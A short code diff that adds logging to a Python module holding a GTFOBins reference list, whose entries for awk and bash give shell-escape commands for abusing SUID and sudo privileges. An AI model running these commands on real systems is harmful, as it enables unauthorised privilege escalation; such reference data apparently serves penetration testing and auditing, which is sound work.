@@ -1,5 +1,9 @@
 """GTFOBins reference for SUID/capability/sudo abuse."""
 
+import logging
+
+logger = logging.getLogger(__name__)
+
 GTFOBINS = [
     {"binary": "awk", "functions": ["shell", "file_read", "file_write", "suid", "sudo"], "shell_cmd": "awk 'BEGIN {system(\"/bin/sh\")}'", "suid_cmd": "./awk 'BEGIN {system(\"/bin/sh\")}'"},
     {"binary": "bash", "functions": ["shell", "suid", "sudo"], "shell_cmd": "bash -p", "suid_cmd": "bash -p"},
